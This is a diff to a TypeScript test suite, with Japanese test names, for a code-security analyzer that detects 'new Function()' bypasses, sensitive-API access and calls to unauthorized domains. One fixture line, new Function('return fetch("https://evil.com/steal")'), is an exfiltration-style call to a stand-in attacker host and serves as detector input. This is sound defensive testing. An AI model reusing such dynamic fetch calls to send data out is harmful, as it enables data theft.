@@ -826,7 +826,7 @@ describe('バイパスパターン検出の強化', () => {
   })
 
   describe('強化3: new Function() コンストラクタ', () => {
-    it('new Function("...") は no-new-function として検出される', () => {
+    it('new Function("...") でセンシティブ API を参照すると no-sensitive-api-override として検出される', () => {
       const code = `
         const fn = new Function('return fetch')
       `
@@ -837,12 +837,65 @@ describe('バイパスパターン検出の強化', () => {
       expect(signals.detectedViolations).toEqual(
         expect.arrayContaining([
           expect.objectContaining({
+            rule: 'no-sensitive-api-override',
+            severity: 'critical',
+            message: expect.stringContaining('fetch'),
+          }),
+        ])
+      )
+    })
+
+    it('new Function("...") で非許可ドメイン URL を参照すると no-unauthorized-domain として検出される', () => {
+      const code = `
+        new Function('return fetch("https://evil.com/steal")')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasNetworkAPI).toBe(true)
+      expect(signals.hasNetworkWithoutPermission).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            rule: 'no-unauthorized-domain',
+            severity: 'critical',
+            message: expect.stringContaining('evil.com'),
+          }),
+        ])
+      )
+    })
+
+    it('new Function("...") でセンシティブ API も URL も参照しない場合は no-new-function として検出される', () => {
+      const code = `
+        const fn = new Function('return 1 + 2')
+      `
+      const signals = analyzeCodeSecurity(code)
+
+      expect(signals.hasEval).toBe(true)
+      expect(signals.detectedViolations).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
             rule: 'no-new-function',
             severity: 'critical',
             message: expect.stringContaining('new Function()'),
           }),
         ])
       )
+    })
+
+    it('bundled dependency で no-new-function は抑制されるが no-sensitive-api-override は抑制されない', () => {
+      const bundledContext: FileContext = {
+        filePath: 'compromised-lib-abc123.js',
+        isUserCode: false,
+        isSharedLibrary: false,
+        isBundledDependency: true,
+      }
+
+      // no-new-function は抑制される（rapier 等の正当な使用）
+      expect(adjustViolationSeverity('no-new-function', 'critical', bundledContext)).toBeNull()
+      // no-sensitive-api-override は抑制されない（攻撃検出）
+      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', bundledContext)).toBe('critical')
+      // no-unauthorized-domain も抑制されない（攻撃検出）
+      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', bundledContext)).toBe('critical')
     })
   })
 
